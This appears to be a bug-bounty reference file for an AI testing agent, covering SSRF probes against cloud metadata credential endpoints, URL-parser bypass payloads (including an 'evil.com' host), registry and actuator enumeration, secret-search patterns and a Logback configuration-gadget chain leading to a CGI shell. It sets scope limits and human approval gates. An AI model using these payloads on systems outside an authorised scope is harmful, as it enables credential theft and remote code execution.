---
name: bb-cloud
description: "bb-cloud — Web-Reachable Cloud/Container Testing Reference. Companion to `bb-ops/playbooks/{ssrf,cloud-imds,config-review,secret-discovery,springboot}.yaml`. Load in cloud-analyzer tasks. Web-reachable surfaces ONLY — no posture tooling."
---

# bb-cloud — Web-Reachable Cloud/Container Testing Reference

Companion to `bb-ops/playbooks/{ssrf,cloud-imds,config-review,secret-discovery,springboot}.yaml`.
Load in cloud-analyzer tasks. Web-reachable surfaces ONLY — no posture tooling.

## SSRF (OAST first, always)
```
# blind signal
value = http://<OAST>.oast.fun/ssrf.<tag>
# then, only via confirmed channel, cloud metadata:
#   AWS : http://169.254.169.254/latest/meta-data/iam/security-credentials/
#   GCP : http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
#         + header Metadata-Flavor: Google
#   Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
#         + header Metadata: true
# internal ranges (RFC1918) only where platform scope allows
```
- Bypass set: redirect-follow, DNS-rebinding (`1ynrnhl.oast.fun`-style), URL-parser
  confusion (`http://169.254.169.254@evil.com`, `http://[::ffff:169.254.169.254]`,
  `http://2130706433`), octal/hex IP encoding, `file://` (only if WAF allows and confirmed).

## Exposed registries / dashboards
```
# container registry web API on the in-scope host
curl -s https://registry.HOST/v2/            # unauth
curl -s https://registry.HOST/v2/_catalog    # repo list
# image name traversal: name params with ../ or encoded slashes
# actuator / management
/actuator /actuator/env /actuator/heapdump /actuator/mappings /actuator/beans
/swagger-ui.html /v3/api-docs /swagger.json /api-docs
/.git/HEAD /.git/config  /backup.zip  /admin
```

## Secret discovery
- Grep JS + sourcemaps: `client_id`, `client_secret`, `api_key`, `AKIA`, `token`,
  `password`, `BEGIN PRIVATE KEY`, internal URLs.
- Validate non-destructively (token introspection / harmless probe). Never abuse.
- Leak eligibility: source in-scope AND impact in-scope → eligible. Otherwise mark
  non-qualifying in the finding.

## Version -> CVE (info-level)
- Match `server`/`x-powered-by`/tech version to known CVEs (nuclei templates do this).
- Never exploit a CVE without human gate (manual task).

## Config-gadget RCE (playbook: config-gadget-rce)
GENERAL GADGET: any upload/import path that can plant a REACHABLE runtime config file = RCE primitive.
Usually chain-completion (needs admin/authz-bypass) — never claim standalone pre-auth.
```
# Logback gadget (Spring Boot/Java): plant logback.xml via import/restore archive.
#   FileAppender + fileHeader writes files AT INIT; watchdog re-applies on change:
#     a) web.xml declaring Tomcat CGIServlet (/bin/sh)
#     b) CGI script (e.g. runs id)
#     c) context descriptor privileged=true
#   then trigger reload -> GET /cgi/script = shell
#   reference: JFrog Artifactory pre-auth RCE via artifactimport (excludeContent=true)
# Groovy/scripting plugin gadget: PUT a Groovy execution block; hit the registered HTTP method.
# Spring/YAML/JS gadget: config.props / spring.config.import / yaml anchors / template-engine eval.
# Trigger points to audit: system import/export, configMap-style CRUD (only if value is later
#   parsed/executed), fileserver uploads landing in served dirs, plugin/template deploy, backup/restore.
```
- Confirm non-intrusively FIRST: plant inert payload (fileHeader writes an empty marker file),
  verify marker appears, THEN human-gate the full RCE PoC.
- Stored-but-never-parsed config = weaker "config injection", not RCE. Never inflate.

## Output
- Evidence: HTTP pair; SSRF includes the OAST interaction. Never self-confirm.
